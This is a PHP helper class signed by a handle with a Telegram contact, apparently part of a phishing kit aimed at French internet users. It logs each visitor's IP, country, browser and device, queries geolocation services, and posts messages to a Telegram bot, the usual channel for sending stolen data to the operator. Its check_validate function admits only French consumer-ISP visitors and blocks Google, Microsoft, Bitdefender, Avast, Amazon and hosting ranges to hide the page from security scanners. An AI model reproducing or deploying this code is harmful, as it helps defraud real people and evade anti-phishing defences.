<?php

/**
 * 
 * 
 * @package Function and object class Tools
 * @version 1.3.0
 * @last-modified February 11, 2022
 * @author MSbou ELGHO3T
 * @copyright Copyright (c) 2022, anon
 * @link https://t.me/MarcoSbou_sp
 * 
 * 
 */


 class Tools{

    public $ip;

    public $info_from_class_os;

    public $count;

    public $infod;

    public function __construct()
    {
        $this->ip = $this->get_client_ip();
        $this->info_from_class_os = $this->infod();
    }


    public function randoms_string($length){
        $characters = 'abcdefjhigklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0;$i < $length;$i++):
            $randomString .= $characters[rand(0, $charactersLength - 1) ];
        endfor;
        return $randomString;
    }

    public function delt($ver,$ver1,$ver2){
        $aa = str_replace($ver,$ver1,$ver2);
        return $aa;
    }

    public function go_to($path)
    {
        return !isset($path) ? $path = null : $path = header('Location:'.$path);
    }

    public function navigation($user_agent){
        $erreur_navigateur = "Unknown Browser";
        $navigateur = array(
            '/msie/i' => 'Internet Explorer',
            '/firefox/i' => 'Firefox',
            '/safari/i' => 'Safari',
            '/chrome/i' => 'Chrome',
            '/edge/i' => 'Edge',
            '/opera/i' => 'Opera',
            '/netscape/i' => 'Netscape',
            '/maxthon/i' => 'Maxthon',
            '/konqueror/i' => 'Konqueror',
            '/mobile/i' => 'Handheld Browser'
        );
        foreach ($navigateur as $regex => $value):
            if (preg_match($regex, $user_agent)):
                $erreur_navigateur = $value;
            endif;
        endforeach;
        return $erreur_navigateur;
    }

    public function system_opiration($user_agent){
        $erreur_systeme = "Unknown OS Platform";
        $OS = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile'
        );
        foreach ($OS as $regex => $value):
            if (preg_match($regex, $user_agent)):        
                $erreur_systeme = $value;
            endif;
    
        endforeach;
        return $erreur_systeme;
    }

    public function Send_telegram($message,$api,$chat_id){
        $local_url = "https://api.telegram.org/bot".$api;
        $formats = "HTML";
        $params=[
            'chat_id'    => $chat_id,
            'text'       => $message,
            'parse_mode' => $formats
        ];
        $init = curl_init();
        curl_setopt_array($init, array(
            CURLOPT_URL				=> $local_url."/sendMessage",
            CURLOPT_HEADER			=> false,
            CURLOPT_RETURNTRANSFER	=> TRUE,
            CURLOPT_POST            => 1,
            CURLOPT_POSTFIELDS      => ($params),
            CURLOPT_SSL_VERIFYPEER  => false
    
            ));
        $details = curl_exec($init); 
        curl_close($init);
        if($details){
            return true;
        }else{
            return false;
        }
    }

    public function save_to_txt($text,$file){
        $result = @fopen( ELGHO3T_ROOT_DIR_PATH ."/logs/".$file, "a+");   
        fwrite($result, $text);
        fclose($result);
        return true;
    }

    public function get_client_ip() 
    {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)):
            $ip = $client;
        elseif(filter_var($forward, FILTER_VALIDATE_IP)):
            $ip = $forward;
        else:
            $ip = $remote;
        endif;
        if($ip == '::1'):
            return $this->ip = '127.0.0.1';
        endif;
        return $this->ip = $ip;
        // return $this->ip = '86.252.48.35';
        // return $this->ip = '41.92.41.229';
    }
    public function get_ip_address()
    {
        $providers = ["HTTP_CLIENT_IP","HTTP_X_FORWARDED_FOR","HTTP_X_FORWARDED","HTTP_X_CLUSTER_CLIENT_IP","HTTP_FORWARDED_FOR","HTTP_FORWARDED","REMOTE_ADDR"];
        foreach ($providers as $key) :
            if (array_key_exists($key, $_SERVER) === true) :
                foreach (explode(',', $_SERVER[$key]) as $ip) :
                    $ip = trim($ip);
                    {
                        return $ip;
                    }
                endforeach;
            endif;
        endforeach;
    }
    public function get_time(){
        return date("y/m/d : H:i:s", time());
    }

    public function syfto_pdf($file){

        $filename = $file;
        header("Content-type: application/pdf");
        header("Content-Length: " . filesize($filename));
        return readfile($filename);

    }

    public function Add_User()
    {
        // $country = $this->contry; 
        $current_date = $this->get_time();
        // $current_date = $this->current_date; 
        // $Douc_R = $this->Douc_R;
        $country = $this->get_client_country();
        $hostnamee = strval($this->get_client_ip());
        $user_list = @fopen( ELGHO3T_ROOT_DIR_PATH. "/logs/success.txt","a+");
        fwrite( $user_list , "TRUE | IP : ". $this->ip ." | Time : ". $current_date ." | Country : ". $country ." | Browser : ".$this->info_from_class_os['browser_name'] ." | IsMobile : ". $this->info_from_class_os['isMobile'] ." | Host : " .$hostnamee ."\r\n");
        fclose($user_list);
    
        return true;
    }
    public function Add_Block()
    {

        $current_date = $this->get_time();
        $hostnamee = strval($this->get_client_ip());
        $country = $this->get_client_country();
        $user_list = @fopen( ELGHO3T_ROOT_DIR_PATH. "/logs/blocked.txt","a+");
        fwrite( $user_list , "TRUE | IP : ". $this->ip ." | Time : ". $current_date ." |  Country : ". $country ." | Browser : ".$this->info_from_class_os['browser_name'] ." | IsMobile : ". $this->info_from_class_os['isMobile'] ." | Host : " .$hostnamee ."\r\n");
        fclose($user_list);
    
        return true;
    }

    public function rowsid($length)
    {
        return $this->randoms_string($length).uniqid();
    }

    public function infod(){
        $os = new BrowserDetection();
        $browser_name = $os->getName();
        $browserVer = $os->getVersion();
        $isMobile       = ($os->isMobile()) ? 'Mobile' : 'Not mobile';
        $platformName   = $os->getPlatform();
        return $this->infod = ['browser_name' => $browser_name,'browser_version' => $browserVer,'isMobile' => $isMobile, 'Platform' => $platformName];
    }
    public function get_name(){
        $aa = basename($_SERVER['PHP_SELF']);
        $dd = str_replace('.php','',$aa);
        return $dd;
    }

    public function Check_User_limet()
    {
        $count = $this->count; 
        $user = $this->ip;
        $lisnC  = @fopen( ELGHO3T_ROOT_DIR_PATH ."/logs/success.txt", "r");
        if ($lisnC):
            while (!feof($lisnC)):            
                $buffer = fgets($lisnC);
                if(strpos($buffer, $this->ip) !== FALSE) //$count ++;
                $this->count ++;
                if($this->count === 6):
                    return true;
                    break;
                endif;
            endwhile;
            fclose($lisnC);
        endif;
    }

    public function get_client_country() {
        $ch = curl_init('http://www.geoplugin.net/json.gp?ip='.$this->ip);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $json = curl_exec($ch);
        curl_close($ch);

        // Decode JSON response
        $ipwhois_result = json_decode($json, true);
        if($ipwhois_result):
            
            return $ipwhois_result["geoplugin_countryName"];
        else:
            return "";

        endif;
    }

    public function visiteur($status,$data,$cause){
        $detect = new BrowserDetection();
        //$ip = get_client_ip();
        $date = date("H:i:s d/m/Y", time());
        $isp = $data;
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $browser_name = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
        $platformName   = $detect->getPlatform();
        $isp_isp = $isp['isp'];
        $isp_org = $isp['org'];
        $isp_cont = $isp['country'];
        // if(in_array($isp['country'],$isp)):

        // endif;
        // $isp_cont = $isp_cont ? $isp['country'] : $isp['contry']  ;
        $str = "<tr><th scope='row'>$this->ip</th> <th>$status</th> <th>$cause</th> <th>$date</th> <th>$isp_isp</th> <th>$isp_org</th> <th>$isp_cont</th> <th>[$isMobile]</th> <th>$platformName</th> <th>$browser_name</th> </tr>";
        file_put_contents('visit.html', $str  , FILE_APPEND | LOCK_EX);
        return true;
    }

    public function grabinfos($ip)
    {
        if($ip == "")
            $ip = $this->get_client_ip();
        if(!isset($_SESSION['data_info'])):
            if($ip == '127.0.0.1'):
                // $ip = realIP;
            endif;
            $ch = curl_init('http://ipwhois.app/json/'.$ip);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $json = curl_exec($ch);
            curl_close($ch);
        
            // Decode JSON response
            $ipwhois_result = json_decode($json, true);
            
            return $_SESSION['data_info'] = $ipwhois_result;
            // endif;
            

        else:
            return $_SESSION['data_info'];

        endif;
        
    }

    public function check_validate($data_info){
        $founda = false;
        $isp = "";
        $user = strval($this->get_client_ip());
        $hostname = gethostbyaddr($user);
        $user1 = explode(".",$user);
        $user2 = array_reverse($user1);
        $comma_user = implode(".", $user2);


        $isok[] = "orange.fr";
        $isok[] = "wanadoo.fr";
        $isok[] = "sfr.fr";
        $isok[] = "sfr";
        $isok[] = "orange";
        $isok[] = "free";
        $isok[] = "Bouygues";
        $isok[] = "sfr.net";
        $isok[] = "club-internet.fr";
        $isok[] = "bbox.net";
        $isok[] = "Free Mobile";
        $isok[] = "numericable.fr";
        $isok[] = "Coriolis";

        /**
         * ======= check validation isp org update 2022
         */
        $notok[] = "ppp";
        $notok[] = "ovh";
        $notok[] = "Google";
        $notok[] = "Bitdefender";
        $notok[] = "Microsoft";
        $notok[] = "cloud";
        $notok[] = "cache";
        $notok[] = "abuse";
        $notok[] = "avast";
        $notok[] = "amazon";
        $notok[] = "oleane";
        $notok[] = "M247";
        $notok[] = "A100";
        $notok[] = "Google LLC";
        $notok[] = "Packethub";

    
        if($hostname == $user || $hostname == $comma_user.".in-addr.arpa" || $hostname !== $user):
            $isp = strtolower($data_info['org'])."|".strtolower($data_info['isp'])."|".strtolower($hostname);
        else:
            $isp = strtolower($hostname);
        endif;
     
        foreach($isok as $value):
            if(strpos($isp,strtolower($value)) !== false):
                $founda = true;
                break;            
            endif;
        endforeach;
        foreach($notok as $baned):
            if(strpos($isp,strtolower($baned)) !== false):
                $founda = false;
                break;          
            endif;
        endforeach;
        return $founda;
    
    }
 }

 /**
 * 
 * 
 * @package Function and object class Tools
 * @version 1.3.0
 * @last-modified February 11, 2022
 * @author MSbou ELGHO3T
 * @copyright Copyright (c) 2022, anon
 * @link https://t.me/MarcoSbou_sp
 * 
 * 
 */
/**
 * Powered By ElGHO3T
 */